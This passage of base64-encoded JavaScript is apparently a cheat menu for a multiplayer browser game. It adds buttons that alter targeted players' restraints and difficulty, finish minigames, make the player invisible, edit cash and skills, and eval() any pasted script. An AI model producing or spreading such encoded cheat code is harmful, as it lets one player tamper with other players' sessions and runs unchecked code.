kxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgICBpY29uLnN0eWxlLndpZHRoID0gIjIzcHgiOwogICAgaWNvbi5zdHlsZS5oZWlnaHQgPSAiMjNweCI7CiAgICBpY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwogICAgaWNvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICItMzBweCI7CiAgICBpY29uLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICItNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwogICAgCiAgICAvLyBNYWludGVuYW5jZSBUZXh0CiAgICB2YXIgdGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKICAgIHRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKICAgIHRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKICAgIHRleHQuaW5uZXJIVE1MID0gIkJDTUUgc2VydmVycyBhcmUgdW5kZXIgbWFpbnRhaW5hbmNlLCB0cnkgYWdhaW4gbGF0ZXIiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CiAgICAKICAgICAgICAKICAgICAgCiAgICAgICAgLy8gQXBwZW5kIHRoZSB0b2FzdCBjb250YWluZXIgdG8gQkMncyBib2R5CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0b2FzdENvbnRhaW5lcik7CiAgICAgIAogICAgICAgIC8vIFRvYXN0J3MgZmFkZS1pbiBhbmltYXRpb24KICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwogICAgICAgIH0sIDApOwogICAgICAKICAgICAgICAvLyBIaWRlIHRvYXN0IHdpdGggYSBmYWRlIG91dCBhbmltYXRpb24KICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgICB9LCA1MDAwMDAwKTsKICAgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgfSwgNTUwMDAwMCk7CiAgICAgIH0gCiAgICAgIHNob3dUb2FzdE1haW50KCk7ICAgICAKICAgICAgdGhyb3cgbmV3IEVycm9yKCdFeGVjdXRpb24gc3RvcHBlZC4nKTsgLy8gc3RvcCBleGVjdXRpbmcgdGhlIHJlc3Qgb2YgdGhlIGNvZGUKICAgIH0gZWxzZSB7CgoKLy9TdGFydCBPZiBDb250ZXh0IE1lbnVfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKLy9EZXNrdG9wIE1lbnVfX19fX19fX19fX19fX19fX19fX19fXwp2YXIgdmlzYiA9IHRydWU7Ci8vY29udGV4dCBNZW51CnZhciBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKLy8gRnVuY3Rpb24gdG8gY3JlYXRlIGN1c3RvbSBjb250ZXh0IG1lbnUgYnV0dG9ucwpmdW5jdGlvbiBjcmVhdGVCdXR0b24odGV4dCwgb25DbGljaykgewogICAgIGNvbnRleHRNZW51T3BlbiA9IHRydWU7CiAgICB2YXIgYnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBidXR0b24uaW5uZXJIVE1MID0gdGV4dDsKICAgIGJ1dHRvbi5vbmNsaWNrID0gb25DbGljazsKICAgIGJ1dHRvbi5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIGJ1dHRvbi5zdHlsZS50ZXh0QWxpZ24gPSAibGVmdCI7CiAgICBidXR0b24uc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgYnV0dG9uLnN0eWxlLmN1cnNvciA9ICJwb2ludGVyIjsKICAgIHJldHVybiBidXR0b247Cn0KCi8vIENyZWF0ZSBzZXBhcmF0b3IgZnVuY3Rpb24KZnVuY3Rpb24gY3JlYXRlU2VwYXJhdG9yKCkgewogICAgdmFyIHNlcGFyYXRvciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImhyIik7CiAgICBzZXBhcmF0b3Iuc3R5bGUubWFyZ2luID0gIjVweCAwIjsKICAgIHJldHVybiBzZXBhcmF0b3I7Cn0KCi8vIEZ1bmN0aW9uIHRvIGRpc3BsYXkgY3VzdG9tIGNvbnRleHQgbWVudV9fX19fCmxldCBjb250ZXh0TWVudVRpbWVyID0gbnVsbDsKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY29udGV4dG1lbnUiLCBmdW5jdGlvbihldmVudCkgewogIGlmIChjb250ZXh0TWVudU9wZW4pIHsKICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7CiAgICByZXR1cm47IC8vIFByZXZlbnQgZHVwZSBtZW51cwogIH0KICBpZiAod2luZG93LmdldFNlbGVjdGlvbigpLnRvU3RyaW5nKCkgIT09ICcnKSB7CiAgICAvLyBBbGxvdyByZWd1bGFyIGNvbnRleHQgbWVudSB3aGVuIHRleHQgaXMgaGlnaGxpZ2h0ZWQKICAgIHJldHVybjsKICB9CiAgZXZlbnQucHJldmVudERlZmF1bHQoKTsKICB2YXIgY29udGV4dE1lbnUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICBjb250ZXh0TWVudS5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgY29udGV4dE1lbnUuc3R5bGUuYmFja2dyb3VuZCA9ICJsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCB3aGl0ZSwgd2hpdGUpIjsKICBjb250ZXh0TWVudS5zdHlsZS5ib3hTaGFkb3cgPSAiMCAwIDNweCAjOTk5IjsKICBjb250ZXh0TWVudS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiOHB4IjsKICBjb250ZXh0TWVudS5zdHlsZS56SW5kZXggPSAiOTk5OSI7CiAgY29udGV4dE1lbnUuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCBibGFjayI7CiAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICBpZiAoJ29udG91Y2hzdGFydCcgaW4gd2luZG93KSB7CiAgICAvLyBIYW5kbGUgbG9uZyBwcmVzcyBvbiBtb2JpbGUgZGV2aWNlcwogICAgY29udGV4dE1lbnVUaW1lciA9IHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIGNvbnRleHRNZW51LnN0eWxlLnRvcCA9IGV2ZW50LnRvdWNoZXNbMF0uY2xpZW50WSArICJweCI7CiAgICAgIGNvbnRleHRNZW51LnN0eWxlLmxlZnQgPSBldmVudC50b3VjaGVzWzBdLmNsaWVudFggKyAicHgiOwogICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRleHRNZW51KTsKICAgICAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICAgIH0sIDUwMCk7CiAgfSBlbHNlIHsKICAgIC8vIEhhbmRsZSByaWdodCBjbGljayBvbiBkZXNrdG9wIGRldmljZXMKICAgIGNvbnRleHRNZW51LnN0eWxlLnRvcCA9IGV2ZW50LmNsaWVudFkgKyAicHgiOwogICAgY29udGV4dE1lbnUuc3R5bGUubGVmdCA9IGV2ZW50LmNsaWVudFggKyAicHgiOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjb250ZXh0TWVudSk7CiAgICBjb250ZXh0TWVudU9wZW4gPSB0cnVlOwogIH0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogICAgY29udGV4dE1lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwogICAgY2xlYXJUaW1lb3V0KGNvbnRleHRNZW51VGltZXIpOwogIH0pOwogICAgCgoKICAgIC8vIEhlYWRlciB3aXRoIEJDTSBsb2dvCiAgICB2YXIgaGVhZGVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBoZWFkZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgIGhlYWRlci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICBoZWFkZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwoKICAgIHZhciBwcm9maWxlUGhvdG8gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgIHByb2ZpbGVQaG90by5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKICAgIHByb2ZpbGVQaG90by5zdHlsZS53aWR0aCA9ICIzMHB4IjsKICAgIHByb2ZpbGVQaG90by5zdHlsZS5oZWlnaHQgPSAiMzBweCI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjIwJSI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUubWFyZ2luUmlnaHQgPSAiMTBweCI7CgogICAgdmFyIGhlYWRlclRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGhlYWRlclRleHQuaW5uZXJIVE1MID0gIjxiPkVzc2VudGlhbHM8L2I+IjsKCiAgICBoZWFkZXIuYXBwZW5kQ2hpbGQocHJvZmlsZVBob3RvKTsKICAgIGhlYWRlci5hcHBlbmRDaGlsZChoZWFkZXJUZXh0KTsKCiAvLyBDdXN0b20gbWFpbiBidXR0b25zCiB2YXIgYnV0dG9uMSA9IGNyZWF0ZUJ1dHRvbigiUmVzdG9yZSBDaGFyYWN0ZXIiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6UGxheWVyLkFwcGVhcmFuY2UgPSBDaGF0U2VhcmNoU2FmZXdvcmRBcHBlYXJhbmNlLnNsaWNlKDApOyAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOyAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIAp9KTsKdmFyIGJ1dHRvbjIgPSBjcmVhdGVCdXR0b24oIkZvcmNlIFJvb20gU3dhcCIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpDaGF0U2VsZWN0U3RhcnRTZWFyY2goJ1gnKSxDaGF0Um9vbVNldExhc3RDaGF0Um9vbSgnJyksZG9jdW1lbnRbJ2dldEVsZW1lbnRCeUlkJ10oJ0lucHV0Q2hhdCcpWydzdHlsZSddWydkaXNwbGF5J109J25vbmUnLGRvY3VtZW50WydnZXRFbGVtZW50QnlJZCddKCdUZXh0QXJlYUNoYXRMb2cnKVsnc3R5bGUnXVsnZGlzcGxheSddPSdub25lJyxDaGF0U2VsZWN0U3RhcnRTZWFyY2goJ1gnKSxDaGF0Um9vbVNldExhc3RDaGF0Um9vbSgnJyk7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uMyA9IGNyZWF0ZUJ1dHRvbigiRnJlZSBUYXJnZXQiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6Q2hhcmFjdGVyUmVsZWFzZVRvdGFsKEN1cnJlbnRDaGFyYWN0ZXIpLENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKEN1cnJlbnRDaGFyYWN0ZXIpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjQgPSBjcmVhdGVCdXR0b24oIlJlbW92ZSBSZXN0cmFpbnQiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6SW52ZW50b3J5VW5sb2NrKEN1cnJlbnRDaGFyYWN0ZXIsIEN1cnJlbnRDaGFyYWN0ZXIuRm9jdXNHcm91cC5OYW1lKTsKICAgIEludmVudG9yeVJlbW92ZShDdXJyZW50Q2hhcmFjdGVyLCBDdXJyZW50Q2hhcmFjdGVyLkZvY3VzR3JvdXAuTmFtZSk7CiAgICBDaGF0Um9vbUNoYXJhY3Rlckl0ZW1VcGRhdGUoQ3VycmVudENoYXJhY3RlciwgQ3VycmVudENoYXJhY3Rlci5Gb2N1c0dyb3VwLk5hbWUpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjUgPSBjcmVhdGVCdXR0b24oIlRhcmdldCBTdHJ1Z2dsZSBEaWZmaWN1bHR5IiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OmRve3ZhciBkaWZjPXByb21wdCgnRGlmZmljdWx0eVx4MjAxLTk2Jyk7fXdoaWxlKCEoZGlmYz49MHgxJiZkaWZjPD0weDYwKSk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtSGVhZCIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU1vdXRoIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgyIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQXJtcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUhhbmRzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTGVncyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUV5ZXMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1GZWV0IiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtRGV2aWNlcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUFkZG9uIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVjayIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU5lY2tSZXN0cmFpbnRzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVja0FjY2Vzc29yaWVzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQm9vdHMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Ib29kIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTm9zZSIsIGRpZmMpOwogICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoQ3VycmVudENoYXJhY3Rlcik7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uNiA9IGNyZWF0ZUJ1dHRvbigiT3BlbiBUYXJnZXQgV2FyZHJvYmUiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6RGlhbG9nQ2hhbmdlQ2xvdGhlcygpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjcgPSBjcmVhdGVCdXR0b24oIkNvbXBsZXRlIFN0cnVnZ2xlIE1pbmlnYW1lIiwgZnVuY3Rpb24oKSB7CiAgICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICAgIGphdmFzY3JpcHQ6U3RydWdnbGVQcm9ncmVzcyA9MTAwMDsKICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgICBEaWFsb2dMZWF2ZSgpOwogICAgfSwgNTAwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7Cgp2YXIgYnV0dG9uOCA9IGNyZWF0ZUJ1dHRvbigiSW52aXNpYmxlIiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICBIZWlnaHQ6ICItIgogICAgICB9OwogICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsgCiAgICAgIHZpc2IgPSBmYWxzZTsKICAgICAgc2hvd1RvYXN0c2NwZygpOwogICAgICB1cGRhdGVDb250ZXh0TWVudSgpOyAKCiAgICAKfSk7Cgp2YXIgYnV0dG9uOSA9IGNyZWF0ZUJ1dHRvbigiVmlzaWJsZSIsIGZ1bmN0aW9uKCkgewogIGphdmFzY3JpcHQ6Q2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogIGRlbGV0ZSBJbnZlbnRvcnlHZXQoUGxheWVyLCAnRW1vdGljb24nKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodDsKICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIHZpc2IgPSB0cnVlOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgdXBkYXRlQ29udGV4dE1lbnUoKTsgCiAgCn0pOwoKdmFyIGJ1dHRvbjEwID0gY3JlYXRlQnV0dG9uKCJDdXN0b20gU2NyaXB0IiwgZnVuY3Rpb24oKSB7CiAgamF2YXNjcmlwdDp2YXIgc2NycCA9IHByb21wdCgiUGFzdGUgeW91ciBzY3JpcHQgaGVyZToiKTsKICBpZiAoc2NycCkgewogICAgZXZhbChzY3JwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICB9Cn0pOwovLyBUcmFuc2l0aW9uIHN0eWxpbmcgZm9yIHRoZSBidXR0b25zCmJ1dHRvbjEuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b24yLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uMy5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjQuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b241LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNi5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjcuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b244LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uOS5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjEwLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKCgoKLy9Ib3ZlciBldmVudHMgZm9yIHRoZSBidXR0b25zCmJ1dHRvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CiAgICB0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKICAgIHRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwogICAgfSk7CmJ1dHRvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKICAgIHRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7CiAgICB9KTsKCmJ1dHRvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uNC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjUuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjUuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b242LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b242LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwLjVweCI7Cn0pOwpidXR0b243LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uOC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uOC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjkuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjkuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b24xMC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uMTAuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgovL0Ryb3Bkb3duIE1lbnVfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCmZ1bmN0aW9uIGZvcmNlY2xvc2VtZW51KCkgewogICAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICBDaGF0Um9vbUNsaWNrQ2hhcmFjdGVyKFBsYXllcik7CiAgICAgIERpYWxvZ0xlYXZlKCk7CiAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7CiAgfQoKIC8vIENyZWF0ZSB0aGUgZHJvcGRvd24gbWVudQp2YXIgc2VsZWN0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2VsZWN0Iik7CnNlbGVjdC5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiMnB4IjsKc2VsZWN0LnN0eWxlLnBhZGRpbmcgPSAiNHB4IjsKc2VsZWN0LnN0eWxlLndpZHRoID0gIjIwMHB4IjsKc2VsZWN0LnN0eWxlLm1hcmdpblRvcCA9ICItMjBweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5SaWdodCA9ICIycHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luQm90dG9tID0gIjNweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjJweCI7CnZhciBvcHRpb24xID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEudmFsdWUgPSAib3B0MSI7Cm9wdGlvbjEudGV4dCA9ICJQZXJzb25hbGlzYXRpb24gTWVudSI7Cm9wdGlvbjEuc2VsZWN0ZWQgPSB0cnVlOwpvcHRpb24xLmRpc2FibGVkID0gdHJ1ZTsKdmFyIG9wdGlvbjIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMi52YWx1ZSA9ICJvcHQyIjsKb3B0aW9uMi50ZXh0ID0gIkVkaXQgQ2FzaCI7CnZhciBvcHRpb24zID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjMudmFsdWUgPSAib3B0MyI7Cm9wdGlvbjMudGV4dCA9ICJNYXggU2tpbGxzIjsKdmFyIG9wdGlvbjQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNC52YWx1ZSA9ICJvcHQ0IjsKb3B0aW9uNC50ZXh0ID0gIk1heCBSZXB1dGF0aW9uIjsKdmFyIG9wdGlvbjUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNS52YWx1ZSA9ICJvcHQ1IjsKb3B0aW9uNS50ZXh